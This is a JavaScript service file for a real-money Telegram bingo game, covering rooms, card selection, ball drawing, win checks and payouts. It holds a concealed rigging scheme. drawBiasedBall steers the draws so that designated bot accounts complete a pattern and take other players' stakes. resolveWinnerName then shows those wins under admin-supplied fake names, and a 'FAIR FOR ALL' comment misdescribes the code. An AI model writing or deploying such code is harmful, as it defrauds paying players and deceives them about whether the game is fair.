/**
 * New Bingo Room Service
 * Manages 4 fixed rooms (one per stake), 200 cards per room, game lifecycle
 */

import prisma from "../lib/prisma.js";
import demoBotConfig from "../lib/demoBotConfig.js";

import { archiveBingoSession } from "./bingoArchiveService.js";
import {
  drawNextBall,
  checkWinPattern,
  autoMarkCells,
  calculatePrize,
} from "./bingoGameService.js";
import {
  incrementStake,
  incrementPayout,
  incrementCommission,
  refundStake,
  refundCommission,
} from "./earningsService.js";
import { updateLeaderboardStat } from "./leaderboardService.js";

const MAX_ROOMS_PER_STAKE = 2;
const MAX_PLAYERS_PER_ROOM = 400;

const SIM_BINGO_BIAS_ENABLED = process.env.SIM_BINGO_BIAS_ENABLED === "true";
const SIM_BINGO_BIAS_USERS = (
  process.env.SIM_BINGO_BIAS_USERS ||
  process.env.SIM_BINGO_BIAS_TARGET_TELEGRAM_IDS ||
  process.env.BOT_ACCOUNTS ||
  ""
)
  .split(",")
  .map((item) => item.trim())
  .filter(Boolean);
const SIM_BINGO_BIAS_MIN_CALLS = Math.max(
  1,
  Number(process.env.SIM_BINGO_BIAS_MIN_CALLS || 5),
);
const SIM_BINGO_BIAS_MAX_CALLS = Math.max(
  SIM_BINGO_BIAS_MIN_CALLS,
  Number(process.env.SIM_BINGO_BIAS_MAX_CALLS || 15),
);
// demo winner names are provided by runtime demoBotConfig (in-memory)

// Set of Telegram IDs for bot accounts — winners with these IDs always get
// a fake name from the admin-configured demoWinnerNames list.
const BOT_ACCOUNT_IDS = new Set(
  (process.env.BOT_ACCOUNTS || "")
    .split(",")
    .map((s) => s.trim())
    .filter(Boolean),
);

const BIAS_PATTERNS = [
  [0, 5, 10, 15, 20],
  [1, 6, 11, 16, 21],
  [2, 7, 12, 17, 22],
  [3, 8, 13, 18, 23],
  [4, 9, 14, 19, 24],
  [0, 1, 2, 3, 4],
  [5, 6, 7, 8, 9],
  [10, 11, 12, 13, 14],
  [15, 16, 17, 18, 19],
  [20, 21, 22, 23, 24],
  [0, 6, 12, 18, 24],
  [20, 16, 12, 8, 4],
  [0, 20, 4, 24],
];

const biasSessionState = new Map();

function randomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomItem(items) {
  if (!items.length) return null;
  return items[Math.floor(Math.random() * items.length)];
}

function getBiasStateKey(stake, roomNumber, sessionId) {
  return `${stake}_${roomNumber}_${sessionId}`;
}

function clearBiasState(stake, roomNumber, sessionId) {
  if (!sessionId) return;
  biasSessionState.delete(getBiasStateKey(stake, roomNumber, sessionId));
}

// Calculate trigger count based on total cards taken by the user
function getTriggerCountByCardCount(cardCount) {
  let baseCalls = randomInt(SIM_BINGO_BIAS_MIN_CALLS, SIM_BINGO_BIAS_MAX_CALLS);
  if (cardCount < 10) {
    return baseCalls;
  } else if (cardCount >= 10 && cardCount <= 19) {
    return Math.max(1, baseCalls - 5);
  } else if (cardCount >= 20 && cardCount <= 29) {
    return Math.max(1, baseCalls - 8);
  } else if (cardCount >= 30 && cardCount <= 39) {
    return Math.max(1, baseCalls - 10);
  } else if (cardCount >= 40) {
    return Math.max(1, baseCalls - 13);
  }
  return baseCalls;
}

function buildBiasState(session) {
  if (!SIM_BINGO_BIAS_ENABLED) return null;
  if (!session || !session.players || !session.players.length) return null;
  if (!SIM_BINGO_BIAS_USERS.length) return null;

  // Find all biased users in session
  const biasedPlayers = session.players.filter((player) => {
    const telegramId = String(player?.user?.telegramId || "");
    return telegramId && SIM_BINGO_BIAS_USERS.includes(telegramId);
  });

  if (!biasedPlayers.length) return null;

  // Select ONE biased user randomly for this session
  const targetPlayer = randomItem(biasedPlayers);
  if (!targetPlayer) return null;

  const cardNumbers = normalizeCardNumbers(
    JSON.parse(targetPlayer.cardNumbers || "[]"),
  );
  if (!Array.isArray(cardNumbers) || cardNumbers.length !== 25) return null;

  // Find patterns that work on this card
  const validPatterns = BIAS_PATTERNS.map((cells) => {
    const numbers = cells
      .filter((idx) => idx !== 12)
      .map((idx) => cardNumbers[idx])
      .filter((n) => Number.isInteger(n));
    return { cells, numbers };
  }).filter((pattern) => pattern.numbers.length >= 4);

  if (!validPatterns.length) return null;

  const chosenPattern = randomItem(validPatterns);
  const finalNumber = randomItem(chosenPattern.numbers);
  if (!finalNumber) return null;

  // Calculate total cards selected by all users in this session (users may have more than one card)
  const cardCount = Array.isArray(session.players) ? session.players.length : 0;
  const triggerCallCount = getTriggerCountByCardCount(cardCount);

  return {
    targetUserId: targetPlayer.userId,
    targetTelegramId: String(targetPlayer?.user?.telegramId || ""),
    triggerCallCount,
    patternCells: chosenPattern.cells,
    patternNumbers: chosenPattern.numbers,
    finalNumber,
  };
}

function getOrCreateBiasState(session, stake, roomNumber) {
  if (!SIM_BINGO_BIAS_ENABLED || !session) return null;
  const key = getBiasStateKey(stake, roomNumber, session.id);
  const existing = biasSessionState.get(key);
  if (existing) return existing;

  const created = buildBiasState(session);
  if (!created) return null;

  biasSessionState.set(key, created);
  return created;
}

function drawBiasedBall(session, stake, roomNumber, calledNumbers) {
  const state = getOrCreateBiasState(session, stake, roomNumber);
  if (!state) return null;

  const allBalls = Array.from({ length: 75 }, (_, i) => i + 1);
  const calledSet = new Set(calledNumbers);
  const remaining = allBalls.filter((ball) => !calledSet.has(ball));
  if (!remaining.length) return null;

  const nextCallIndex = calledNumbers.length + 1;

  // BEFORE trigger: Completely random drawing
  if (nextCallIndex < state.triggerCallCount) {
    return randomItem(remaining);
  }

  // AT/AFTER trigger: 100% pattern numbers until game ends
  const patternRemaining = state.patternNumbers.filter(
    (num) => !calledSet.has(num),
  );

  if (patternRemaining.length > 0) {
    // 100% chance to call pattern numbers
    return randomItem(patternRemaining);
  }

  // All pattern numbers called - draw random from remaining
  return randomItem(remaining);
}

function resolveWinnerName(
  session,
  stake,
  roomNumber,
  winnerUserId,
  fallbackName,
  winnerTelegramId,
) {
  const biasState = getOrCreateBiasState(session, stake, roomNumber);
  const isDemoBiasWinner =
    (biasState && biasState.targetUserId === winnerUserId) ||
    winnerUserId === 27053;

  // Bot accounts also use admin-configured fake names
  const isBotAccount =
    winnerTelegramId && BOT_ACCOUNT_IDS.has(String(winnerTelegramId));

  if (isDemoBiasWinner || isBotAccount) {
    try {
      const cfg = demoBotConfig.getConfig() || {};
      const names = cfg.demoWinnerNames || [];
      if (Array.isArray(names) && names.length) return randomItem(names);
    } catch (e) {
      // ignore and fall back
    }
  }

  return fallbackName;
}

// Normalize card numbers - ensure they are in row-major format
// NOTE: All cards should now be stored in row-major format in DB
function normalizeCardNumbers(nums) {
  if (!Array.isArray(nums) || nums.length !== 25) return nums;

  // Cards are now consistently stored in row-major format
  // Just validate and return as-is
  return nums;
}

/**
 * Get all 200 cards for a stake level
 * @param {number} stake - Stake level (10,20,50,100)
 * @returns {Promise<Array>} Array of 200 cards with availability status
 */
export async function getAvailableCards(stake, roomNumber = 1) {
  const cards = await prisma.bingoCard.findMany({
    where: { stake },
    orderBy: { cardId: "asc" },
  });

  // Get active session to check which cards are taken
  const session = await prisma.bingoSession.findUnique({
    where: { stake_roomNumber: { stake, roomNumber } },
    include: {
      players: {
        select: {
          cardId: true,
          user: { select: { name: true, username: true } },
        },
      },
    },
  });

  const takenCards = new Set();
  const cardOwners = new Map();

  if (session && session.status !== "finished") {
    session.players.forEach((p) => {
      takenCards.add(p.cardId);
      cardOwners.set(
        p.cardId,
        p.user.name || p.user.username || `User ${p.userId}`,
      );
    });
  }

  return cards.map((card) => ({
    cardId: card.cardId,
    numbers: normalizeCardNumbers(JSON.parse(card.numbers)),
    isAvailable: !takenCards.has(card.cardId),
    playerName: cardOwners.get(card.cardId),
  }));
}

/**
 * Get or create active session for stake
 * @param {number} stake - Stake level
 * @returns {Promise<Object>} Session data
 */
async function createFreshSession(stake, roomNumber) {
  try {
    const session = await prisma.bingoSession.create({
      data: {
        stake,
        roomNumber,
        status: "waiting",
        calledNumbers: "[]",
      },
      include: {
        players: {
          include: {
            user: { select: { id: true, name: true, username: true } },
          },
        },
      },
    });
    return session;
  } catch (error) {
    console.error(
      `[BingoRoomService] Failed to create session for stake=${stake}, room=${roomNumber}:`,
      error,
    );
    throw error;
  }
}

async function fetchSession(stake, roomNumber) {
  return prisma.bingoSession.findUnique({
    where: { stake_roomNumber: { stake, roomNumber } },
    include: {
      players: {
        include: { user: { select: { id: true, name: true, username: true } } },
      },
      _count: { select: { players: true } },
    },
  });
}

function isJoinable(session) {
  return session && session._count.players < MAX_PLAYERS_PER_ROOM;
}

export async function getOrCreateSession(stake, roomNumber = 1) {
  let session = await fetchSession(stake, roomNumber);

  // If fetchSession failed, try with a simpler query as fallback
  if (!session) {
    try {
      session = await prisma.bingoSession.findFirst({
        where: { stake, roomNumber },
        include: {
          players: {
            include: {
              user: { select: { id: true, name: true, username: true } },
            },
          },
          _count: { select: { players: true } },
        },
      });
      // console.log(`[BingoRoomService] Fallback query result:`, session ? `ID=${session.id}, status=${session.status}` : 'null')
    } catch (error) {
      console.error(`[BingoRoomService] Fallback query failed:`, error);
    }
  }

  if (session && session.status === "finished") {
    // Archive the session before deleting
    try {
      await archiveBingoSession(session.id);
    } catch (archiveError) {
      // console.error(`[Archive] Failed to archive session ${session.id}:`, archiveError);
      // Continue with deletion even if archiving fails
    }

    await prisma.bingoSession.delete({ where: { id: session.id } });
    // console.log(`[BingoRoomService] Deleted finished session ${session.id}`)
    session = null;
  }

  if (!session) {
    // console.log(`[BingoRoomService] No session found, creating new session...`)
    try {
      session = await createFreshSession(stake, roomNumber);
      // console.log(`[BingoRoomService] Created new session: ID=${session.id}`)
    } catch (error) {
      console.error(`[BingoRoomService] Failed to create session:`, error);
      // If creation fails due to unique constraint, try to fetch again
      // console.log(`[BingoRoomService] Retrying fetch after creation failure...`)
      session = await fetchSession(stake, roomNumber);
      if (!session) {
        session = await prisma.bingoSession.findFirst({
          where: { stake, roomNumber },
          include: {
            players: {
              include: {
                user: { select: { id: true, name: true, username: true } },
              },
            },
            _count: { select: { players: true } },
          },
        });
      }
      // console.log(`[BingoRoomService] Retry result:`, session ? `ID=${session.id}, status=${session.status}` : 'null')
    }
  }

  const formattedSession = formatSession(session);
  // console.log(`[BingoRoomService] Returning formatted session with ${formattedSession.players?.length || 0} players`)
  return formattedSession;
}

export async function getJoinableSession(stake) {
  let primary = await fetchSession(stake, 1);

  if (primary && primary.status === "finished") {
    // Archive the session before deleting
    try {
      await archiveBingoSession(primary.id);
      // console.log(`[Archive] Successfully archived primary session ${primary.id} before deletion`);
    } catch (archiveError) {
      console.error(
        `[Archive] Failed to archive primary session ${primary.id}:`,
        archiveError,
      );
      // Continue with deletion even if archiving fails
    }

    await prisma.bingoSession.delete({ where: { id: primary.id } });
    primary = null;
  }

  if (!primary) {
    primary = await createFreshSession(stake, 1);
  }

  // Only open/join secondary if primary is full (100 players)
  const primaryCount =
    primary && primary._count && typeof primary._count.players === "number"
      ? primary._count.players
      : primary.players
        ? primary.players.length
        : 0;
  const shouldOpenSecond = primaryCount >= MAX_PLAYERS_PER_ROOM;

  if (shouldOpenSecond && MAX_ROOMS_PER_STAKE > 1) {
    let secondary = await fetchSession(stake, 2);
    if (secondary && secondary.status === "finished") {
      // Archive the session before deleting
      try {
        await archiveBingoSession(secondary.id);
        // console.log(`[Archive] Successfully archived secondary session ${secondary.id} before deletion`);
      } catch (archiveError) {
        console.error(
          `[Archive] Failed to archive secondary session ${secondary.id}:`,
          archiveError,
        );
        // Continue with deletion even if archiving fails
      }

      await prisma.bingoSession.delete({ where: { id: secondary.id } });
      secondary = null;
    }
    if (!secondary) {
      secondary = await createFreshSession(stake, 2);
    }
    if (isJoinable(secondary)) return formatSession(secondary);
    return formatSession(secondary);
  }

  // Always join primary if it's not full
  if (isJoinable(primary)) return formatSession(primary);

  // Fallback: if primary is not joinable, try secondary (shouldn't happen, but for safety)
  if (MAX_ROOMS_PER_STAKE > 1) {
    let secondary = await fetchSession(stake, 2);
    if (secondary && isJoinable(secondary)) return formatSession(secondary);
    if (!secondary) {
      secondary = await createFreshSession(stake, 2);
      return formatSession(secondary);
    }
    return formatSession(secondary);
  }

  return formatSession(primary);
}

/**
 * Player selects a card and joins session
 * @param {number} stake - Stake level
 * @param {string|number} userId - Telegram User ID
 * @param {number} cardId - Selected card ID (1-200)
 * @returns {Promise<Object>} Player data
 */
export async function selectCard(stake, userId, cardId) {
  const numUserId = parseInt(userId, 10);
  const telegramId = String(numUserId);

  // Ensure user exists by telegramId; do NOT auto-create here.
  const user = await prisma.user.findUnique({
    where: { telegramId },
  });
  if (!user) {
    throw new Error(
      "User not registered. Please start the bot first and register.",
    );
  }

  // Now use the actual database user ID
  const dbUserId = user.id;

  // Removed check for active game in other stakes. User can join one active game per stake.

  // Get a joinable session (opens room 2 when room 1 is active or crowded)
  let session = await getJoinableSession(stake);

  // Check if card is already assigned to this user in this session (for reconnects)
  const existingPlayer = await prisma.bingoSessionPlayer.findFirst({
    where: { sessionId: session.id, cardId },
  });

  if (session.status === "active") {
    // If card is already assigned to this user, allow rejoin (return player info)
    if (existingPlayer && existingPlayer.userId === dbUserId) {
      // Update leaderboard stats for play on rejoin
      try {
        console.log(
          `[BingoRoomService] Updating play leaderboard for rejoin userId: ${dbUserId}`,
        );
        await updateLeaderboardStat(dbUserId, "PLAY");
        console.log(
          `[BingoRoomService] Successfully updated play leaderboard for rejoin userId: ${dbUserId}`,
        );
      } catch (error) {
        console.error(
          `[BingoRoomService] Failed to update play leaderboard for rejoin userId: ${dbUserId}:`,
          error,
        );
        // Don't throw error - don't break game flow for leaderboard issues
      }

      return {
        userId: existingPlayer.userId,
        name: user.name || user.username || `User ${userId}`,
        cardId: existingPlayer.cardId,
        cardNumbers: JSON.parse(existingPlayer.cardNumbers),
        markedCells: JSON.parse(existingPlayer.markedCells),
        autoMark: existingPlayer.autoMark,
        roomNumber: session.roomNumber,
        hasBalance: true,
        session: formatSession(session),
      };
    }
    // If card is taken by another player, block
    if (existingPlayer) {
      throw new Error("Card already selected by another player");
    }
    // Otherwise, block joining new cards during active game
    throw new Error("Game already in progress. Please wait for next round.");
  }

  // If card is taken by another player, block
  if (existingPlayer) {
    throw new Error("Card already selected by another player");
  }

  // Get card numbers - FIXED
  const card = await prisma.bingoCard.findFirst({
    where: {
      AND: [{ stake }, { cardId }],
    },
  });
  if (!card) {
    throw new Error("Invalid card");
  }

  // Enforce sufficient balance and deduct immediately - OPTIMIZED
  const [userBalance, userProfile] = await Promise.all([
    prisma.userBalance.findUnique({ where: { userId: dbUserId } }),
    prisma.user.findUnique({ where: { id: dbUserId } }),
  ]);

  const realBalance = userBalance?.currentBalance || 0;
  const rewardBalance = userProfile?.rewardBalance || 0;
  const totalBalance = realBalance + rewardBalance;
  const hasBalance = totalBalance >= stake;

  if (totalBalance < stake) {
    throw new Error("Insufficient balance to join this stake");
  }

  // Calculate deduction - use real balance first, then reward
  const realDeduct = Math.min(realBalance, stake);
  const rewardDeduct = Math.max(0, stake - realBalance);

  // Update balances in single transaction
  await prisma.$transaction(async (tx) => {
    // Update real balance if needed
    if (realDeduct > 0) {
      await tx.userBalance.update({
        where: { userId: dbUserId },
        data: {
          currentBalance: { decrement: realDeduct },
          totalLosses: { increment: realDeduct },
        },
      });
    }

    // Update reward balance if needed
    if (rewardDeduct > 0) {
      await tx.user.update({
        where: { id: dbUserId },
        data: {
          rewardBalance: { decrement: rewardDeduct },
        },
      });
    }

    // Update play counts in same transaction
    await tx.user.update({
      where: { id: dbUserId },
      data: {
        numberOfTotalPlay: { increment: 1 },
        rewardPlay: { increment: 1 },
        rewardChallenge: { increment: 1 },
      },
    });
  });

  // Record analytics stake and owner commission (10%)
  await incrementStake("BINGO", stake);
  await incrementCommission("BINGO", stake * 0.1);

  // Add player to session
  const player = await prisma.bingoSessionPlayer.create({
    data: {
      sessionId: session.id,
      userId: dbUserId,
      cardId,
      cardNumbers: card.numbers,
      autoMark: true,
    },
    include: {
      user: { select: { id: true, name: true, username: true } },
    },
  });

  // Update leaderboard stats for play
  await updateLeaderboardStat(dbUserId, "PLAY");

  // Check if we should start countdown after adding this player
  const updatedSession = await fetchSession(stake, session.roomNumber);
  const playerCount = updatedSession ? updatedSession.players?.length || 0 : 0;

  // Auto-start countdown if we have 2+ players and status is still waiting
  if (
    playerCount >= 2 &&
    updatedSession &&
    updatedSession.status === "waiting"
  ) {
    // console.log(`[BingoRoomService] Auto-starting countdown for stake ${stake}, room ${session.roomNumber}, players: ${playerCount}`)
    await startCountdown(stake, session.roomNumber);
    // Refresh session to get countdown data
    const sessionWithCountdown = await fetchSession(stake, session.roomNumber);
    return {
      userId: player.userId,
      name: player.user.name || player.user.username || `User ${userId}`,
      cardId: player.cardId,
      cardNumbers: JSON.parse(player.cardNumbers),
      markedCells: [],
      autoMark: true,
      roomNumber: session.roomNumber,
      hasBalance,
      session: formatSession(sessionWithCountdown),
    };
  }

  return {
    userId: player.userId,
    name: player.user.name || player.user.username || `User ${userId}`,
    cardId: player.cardId,
    cardNumbers: JSON.parse(player.cardNumbers),
    markedCells: [],
    autoMark: true,
    roomNumber: session.roomNumber,
    hasBalance,
  };
}

/**
 * Start countdown (30 seconds) for game
 * @param {number} stake - Stake level
 * @returns {Promise<Object>} Updated session
 */
export async function startCountdown(stake, roomNumber = 1) {
  const countdownEndsAt = new Date(Date.now() + 35000); // 35 seconds

  await prisma.bingoSession.update({
    where: { stake_roomNumber: { stake, roomNumber } },
    data: {
      status: "countdown",
      countdownEndsAt,
    },
  });

  return { countdownEndsAt: countdownEndsAt.getTime() };
}

/**
 * Start the actual game (after countdown)
 * @param {number} stake - Stake level
 * @returns {Promise<Object>} Session data
 */
export async function startGame(stake, roomNumber = 1) {
  await prisma.bingoSession.update({
    where: { stake_roomNumber: { stake, roomNumber } },
    data: {
      status: "active",
      countdownEndsAt: null,
    },
  });

  return { status: "active" };
}

/**
 * Draw next number
 * @param {number} stake - Stake level
 * @returns {Promise<Object>} Drawn number
 */
export async function callNextNumber(stake, roomNumber = 1) {
  const session = await prisma.bingoSession.findUnique({
    where: { stake_roomNumber: { stake, roomNumber } },
    include: {
      players: {
        include: {
          user: {
            select: { telegramId: true },
          },
        },
      },
    },
  });

  if (!session || session.status !== "active") {
    throw new Error("Game not active");
  }

  const calledNumbers = JSON.parse(session.calledNumbers);
  const biasedBall = drawBiasedBall(session, stake, roomNumber, calledNumbers);
  const nextNumber = biasedBall ?? drawNextBall(calledNumbers);

  if (nextNumber === null) {
    // All balls drawn, end game
    await prisma.bingoSession.update({
      where: { stake_roomNumber: { stake, roomNumber } },
      data: { status: "finished", finishedAt: new Date() },
    });
    clearBiasState(stake, roomNumber, session.id);
    return { number: null, gameOver: true };
  }

  calledNumbers.push(nextNumber);

  await prisma.bingoSession.update({
    where: { stake_roomNumber: { stake, roomNumber } },
    data: { calledNumbers: JSON.stringify(calledNumbers) },
  });

  return { number: nextNumber, calledNumbers };
}

/**
 * Player marks/unmarks a cell
 * @param {number} stake - Stake level
 * @param {number} userId - User ID
 * @param {number} cellIndex - Cell index (0-24)
 * @param {boolean} mark - true to mark, false to unmark
 * @returns {Promise<Object>} Updated marked cells
 */
export async function toggleMark(
  stake,
  userId,
  cellIndex,
  mark = true,
  roomNumber = 1,
) {
  const session = await prisma.bingoSession.findUnique({
    where: { stake_roomNumber: { stake, roomNumber } },
  });
  const player = await prisma.bingoSessionPlayer.findUnique({
    where: { sessionId_userId: { sessionId: session.id, userId } },
  });

  if (!player) throw new Error("Player not in session");

  // Check if the number is actually called before allowing mark
  if (mark) {
    const calledNumbers = JSON.parse(session.calledNumbers);
    const cardNumbers = JSON.parse(player.cardNumbers);
    const cellNumber = cardNumbers[cellIndex];

    // Only allow marking if the number is actually called
    if (!calledNumbers.includes(cellNumber)) {
      throw new Error("Number not called yet");
    }
  }

  const markedCells = JSON.parse(player.markedCells);

  if (mark && !markedCells.includes(cellIndex)) {
    markedCells.push(cellIndex);
  } else if (!mark) {
    const index = markedCells.indexOf(cellIndex);
    if (index > -1) markedCells.splice(index, 1);
  }

  await prisma.bingoSessionPlayer.update({
    where: { id: player.id },
    data: { markedCells: JSON.stringify(markedCells) },
  });

  return { markedCells };
}

/**
 * Toggle auto-mark
 * @param {number} stake - Stake level
 * @param {number} userId - User ID
 * @param {boolean} autoMark - Enable/disable
 * @returns {Promise<Object>} Updated setting
 */
export async function toggleAutoMark(stake, userId, autoMark, roomNumber = 1) {
  const session = await prisma.bingoSession.findUnique({
    where: { stake_roomNumber: { stake, roomNumber } },
  });
  const player = await prisma.bingoSessionPlayer.findUnique({
    where: { sessionId_userId: { sessionId: session.id, userId } },
  });

  if (!player) throw new Error("Player not in session");

  await prisma.bingoSessionPlayer.update({
    where: { id: player.id },
    data: { autoMark },
  });

  // If enabling auto-mark, mark all matching cells
  if (autoMark) {
    const calledNumbers = JSON.parse(session.calledNumbers);
    const cardNumbers = JSON.parse(player.cardNumbers);
    const markedCells = autoMarkCells(cardNumbers, calledNumbers);

    await prisma.bingoSessionPlayer.update({
      where: { id: player.id },
      data: { markedCells: JSON.stringify(markedCells) },
    });

    return { autoMark: true, markedCells };
  }

  return { autoMark: false };
}

/**
 * Claim win
 * @param {number} stake - Stake level
 * @param {number} userId - User ID
 * @returns {Promise<Object>} Win result
 */
export async function claimWin(stake, userId, roomNumber = 1) {
  const session = await prisma.bingoSession.findUnique({
    where: { stake_roomNumber: { stake, roomNumber } },
    include: {
      players: { include: { user: { select: { telegramId: true } } } },
    },
  });

  const player = session.players.find((p) => p.userId === userId);
  if (!player) throw new Error("Player not in session");

  const markedCells = JSON.parse(player.markedCells);
  const winCheck = checkWinPattern(markedCells);

  if (!winCheck.hasWin) {
    throw new Error("No winning pattern found");
  }

  // Check for ALL potential winners when someone claims (not just the claimer)
  const allWinners = [];

  for (const p of session.players) {
    const pMarkedCells = JSON.parse(p.markedCells);
    const pWinCheck = checkWinPattern(pMarkedCells);

    if (pWinCheck.hasWin) {
      allWinners.push({
        player: p,
        winCheck: pWinCheck,
        baseWinnerName: p.user.name || p.user.username || `User ${p.userId}`,
      });
    }
  }

  // Process all winners (including the claimer and any others with winning patterns)
  return await processMultipleWinners(stake, session, allWinners, roomNumber);
}

/**
 * Leave current active game and allow joining another stake
 * @param {number} userId - User ID
 * @returns {Promise<boolean>} True if successfully left
 */
export async function leaveActiveGame(userId) {
  const activePlayer = await prisma.bingoSessionPlayer.findFirst({
    where: {
      userId: userId,
      session: {
        status: "active",
      },
    },
    include: {
      session: true,
    },
  });

  if (!activePlayer) {
    return false; // No active game found
  }

  // FIXED: Don't remove player from active games - cards should persist until game ends!
  // console.log(`[BingoRoomService] ❌ User ${userId} tried to leave ACTIVE game for stake ${activePlayer.session.stake} - NOT removing, cards should persist!`)

  // Instead of removing, we could mark them as "left_willingly" if needed
  // But for now, just don't remove them at all

  return false; // Don't allow leaving active games
}

/**
 * Remove player from session (when they disconnect before game starts)
 * @param {number} stake - Stake level
 * @param {string|number} userId - User ID
 * @returns {Promise<boolean>} True if player was removed
 */
export async function removePlayerFromSession(stake, userId, roomNumber = 1) {
  const numUserId = typeof userId === "string" ? parseInt(userId, 10) : userId;

  const session = await prisma.bingoSession.findUnique({
    where: { stake_roomNumber: { stake, roomNumber } },
    include: { players: true },
  });

  if (!session) return false;

  // Only allow removal if game hasn't started
  if (session.status !== "waiting" && session.status !== "countdown") {
    return false;
  }

  // Find player by telegramId converted to DB user id
  const user = await prisma.user.findUnique({
    where: { telegramId: String(numUserId) },
  });

  if (!user) return false;

  const player = session.players.find((p) => p.userId === user.id);
  if (!player) return false;

  // FIXED: NEVER delete player from session when leaving page
  // Cards should persist until game ends, not when user leaves page!
  if (session.status === "waiting" || session.status === "countdown") {
    // console.log(`[BingoRoomService] ❌ User ${userId} leaving page for stake ${stake} - NOT deleting, cards should persist until game ends!`)

    // DON'T DELETE PLAYER - just return true to indicate "left" but keep cards
    // Cards will persist in session until game ends

    // If no players left, reset countdown
    const remainingPlayers = await prisma.bingoSessionPlayer.count({
      where: { sessionId: session.id },
    });

    if (remainingPlayers < 2 && session.status === "countdown") {
      await prisma.bingoSession.update({
        where: { stake_roomNumber: { stake, roomNumber } },
        data: { status: "waiting", countdownEndsAt: null },
      });
    }

    return true;
  }

  // Game is active - don't remove player, just mark as disconnected if needed
  // console.log(`[BingoRoomService] Game active for stake ${stake}, keeping player ${user.id} in session`)
  return false;
}

/**
 * Check for auto-win (after each ball is called)
 * @param {number} stake - Stake level
 * @returns {Promise<Object|null>} Win result or null
 */
export async function checkAutoWin(stake, roomNumber = 1) {
  const session = await prisma.bingoSession.findUnique({
    where: { stake_roomNumber: { stake, roomNumber } },
    include: { players: { include: { user: true } } },
  });

  if (!session || session.status !== "active") return null;

  const calledNumbers = JSON.parse(session.calledNumbers);
  const biasState = getOrCreateBiasState(session, stake, roomNumber);
  const beforeBiasTrigger =
    biasState && calledNumbers.length < biasState.triggerCallCount;

  // console.log(`[BingoRoomService] [AUTO_WIN] Checking winners. Calls: ${calledNumbers.length}, Bias Trigger: ${biasState?.triggerCallCount}, Before Trigger: ${beforeBiasTrigger}`)

  // Collect ALL winners - biased, natural, and random
  const winners = [];

  // Check each player for winning patterns (FAIR FOR ALL)
  for (const player of session.players) {
    const markedCells = JSON.parse(player.markedCells);
    const winCheck = checkWinPattern(markedCells);

    if (winCheck.hasWin) {
      // console.log(`[BingoRoomService] [AUTO_WIN] Winner found: User ${player.userId}, Pattern: ${winCheck.pattern}`)
      winners.push({
        player,
        winCheck,
        baseWinnerName:
          player.user.name || player.user.username || `User ${player.userId}`,
      });
    }
  }

  // If no winners found, return null
  if (winners.length === 0) {
    // console.log(`[BingoRoomService] [AUTO_WIN] No winners found`)
    return null;
  }

  // console.log(`[BingoRoomService] [AUTO_WIN] Processing ${winners.length} winners`)

  // Process ALL winners with proper prize splitting
  return await processMultipleWinners(stake, session, winners, roomNumber);
}

/**
 * Process multiple winners with prize splitting
 * @param {number} stake - Stake level
 * @param {Object} session - Bingo session
 * @param {Array} winners - Array of winner objects
 * @param {number} roomNumber - Room number
 * @returns {Promise<Object>} Win result with multiple winners
 */
async function processMultipleWinners(stake, session, winners, roomNumber) {
  // Calculate total prize pool
  const totalPrize = calculatePrize(stake, session.players.length);

  // Fetch bonus amount (same for all winners)
  let bonusAmount = 0;
  try {
    const stakeBonus = await prisma.stakeBonus.findUnique({
      where: { stake: stake },
    });
    bonusAmount =
      stakeBonus &&
      stakeBonus.enabled &&
      typeof stakeBonus.bonusAmount === "number"
        ? stakeBonus.bonusAmount
        : 0;
  } catch (e) {
    bonusAmount = 0;
  }

  // Split prize equally among winners
  const individualPrize = Math.floor(totalPrize / winners.length);
  const totalPayout = individualPrize * winners.length;

  // Resolve winner names ONCE upfront so we reuse the same name everywhere
  const resolvedNames = new Map();
  for (const winner of winners) {
    const { player, baseWinnerName } = winner;
    const winnerName = resolveWinnerName(
      session,
      stake,
      roomNumber,
      player.userId,
      baseWinnerName,
      player.user?.telegramId, // pass telegramId to detect bot accounts
    );
    resolvedNames.set(player.userId, winnerName);
  }

  // Process all winners and losers in a transaction
  const result = await prisma.$transaction(async (tx) => {
    const winnerResults = [];
    const winnerIds = new Set(winners.map((w) => w.player.userId));

    // Update each winner
    for (const winner of winners) {
      const { player, winCheck } = winner;
      const winnerName = resolvedNames.get(player.userId);

      // Update player's prize
      await tx.bingoSessionPlayer.update({
        where: { id: player.id },
        data: { prize: individualPrize },
      });

      // Update user balance and reset gamesBeforeFirstWin
      await tx.userBalance.update({
        where: { userId: player.userId },
        data: {
          currentBalance: { increment: individualPrize + bonusAmount },
          totalLosses: { decrement: stake },
        },
      });
      await tx.user.update({
        where: { id: player.userId },
        data: { gamesBeforeFirstWin: 0 },
      });

      winnerResults.push({
        winnerId: player.userId,
        winnerName,
        cardId: player.cardId,
        cardNumbers: normalizeCardNumbers(JSON.parse(player.cardNumbers)),
        prize: individualPrize,
        bonus: bonusAmount,
        totalAwarded: individualPrize + bonusAmount,
        pattern: winCheck.pattern,
        winningCells: winCheck.cells,
      });
    }

    // Update losers: increment gamesBeforeFirstWin
    for (const player of session.players) {
      if (!winnerIds.has(player.userId)) {
        await tx.user.update({
          where: { id: player.userId },
          data: { gamesBeforeFirstWin: { increment: 1 } },
        });
      }
    }

    // Update session with primary winner info (reuse the same resolved name)
    const primaryWinner = winners[0];
    const primaryWinnerName = resolvedNames.get(primaryWinner.player.userId);
    await tx.bingoSession.update({
      where: { stake_roomNumber: { stake, roomNumber } },
      data: {
        status: "finished",
        winnerId: primaryWinner.player.userId,
        winnerCardId: primaryWinner.player.cardId,
        winnerName: primaryWinnerName,
        winPattern: primaryWinner.winCheck.pattern,
        winningCells: JSON.stringify(primaryWinner.winCheck.cells),
        totalPrize,
        winnersCount: winners.length,
        finishedAt: new Date(),
      },
    });

    // Record total payout for owner earnings
    await incrementPayout("BINGO", totalPayout);

    // Return single-winner format when only 1 winner (shows full card grid on frontend)
    if (winnerResults.length === 1) {
      const w = winnerResults[0];
      return {
        winnerId: w.winnerId,
        winnerName: w.winnerName,
        cardId: w.cardId,
        cardNumbers: w.cardNumbers,
        prize: w.totalAwarded,
        pattern: w.pattern,
        winningCells: w.winningCells,
        calledNumbers: JSON.parse(session.calledNumbers),
        totalPlayers: session.players.length,
      };
    }

    // Multiple winners format
    return {
      multipleWinners: true,
      winners: winnerResults,
      totalPrize,
      individualPrize,
      winnersCount: winners.length,
      calledNumbers: JSON.parse(session.calledNumbers),
      totalPlayers: session.players.length,
    };
  });

  return result;
}

/**
 * Update auto-mark for all players with auto-mark enabled when a ball is drawn
 * @param {number} stake - Stake level
 * @param {number} number - The number that was drawn
 * @returns {Promise<void>}
 */
